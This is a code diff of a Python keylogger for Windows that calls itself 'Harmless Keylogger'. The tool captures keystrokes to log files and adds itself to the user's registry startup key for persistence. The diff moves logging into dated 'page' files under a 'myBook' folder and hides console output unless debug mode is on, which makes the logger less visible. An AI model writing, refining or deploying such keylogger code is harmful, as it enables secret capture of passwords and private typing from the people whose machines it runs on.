@@ -4,12 +4,13 @@ import win32event
 import winerror
 import json
 import os
-from os.path import exists
+from os.path import exists, join
 import sys
+from datetime import timedelta, date
 from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue
 
-# File where the Characters get logged
-file = 'myBook.txt'
+# Folder where the pages of your book get logged
+book_path = 'myBook'
 # Buffer for characters
 line_buffer = ''
 # Buffer Size limit 
@@ -22,18 +23,9 @@ LOGGER_NAME = "Harmless Keylogger"
 current_file_path = os.path.realpath(sys.argv[0])
 # Directory path
 dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
-print(dir_path)
 
 # Config Dict
 config = {}
-
-# Disallowing multiple instances
-mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start')
-if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-    mutex = None
-    if config["mode"] == "debug":
-        print("Multiple instances are not allowed")
-    exit(0)
 
 # Read confgi from json file
 def read_config():
@@ -44,6 +36,17 @@ def read_config():
             return True
     else:
         return False
+
+# Read the configurarion
+read_config()
+
+# Disallowing multiple instances
+mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start')
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    if config["mode"] == "debug":
+        print("Multiple instances are not allowed")
+    exit(0)
 
 # Add to startup for persistence
 def add_to_startup():
@@ -83,6 +86,10 @@ def log_debug():
 # Append file with pressed keys
 def log_local():
     global line_buffer
+    path = join(dir_path, book_path)
+    file = join(path, "page_" + (date.today() - timedelta(days=1)).strftime('%Y-%m-%d') + ".txt")
+    if not exists(path):
+        os.makedirs(path)    
     f = open(file, "a", encoding='utf8')
     f.write(line_buffer)
     f.close
@@ -132,18 +139,16 @@ def main():
     global line_buffer
     line_buffer = line_buffer.removesuffix("E")
     log_local()
-    print("Keylogger stopped.")
-    return
+    if config["mode"] == 'debug':
+        print("Keylogger stopped.")
+    exit()
 
 if __name__ == '__main__':
-    # # Read the configurarion
-    read_config()
-
-    # # Debug mode Write single characters 
+    # Debug mode Write single characters 
     if config["mode"] == 'debug':
         CHAR_LIMIT = 1
 
-    # # Add to startup
+    # Add to startup
     if config["auto-start"]:
         add_to_startup()
     else: 
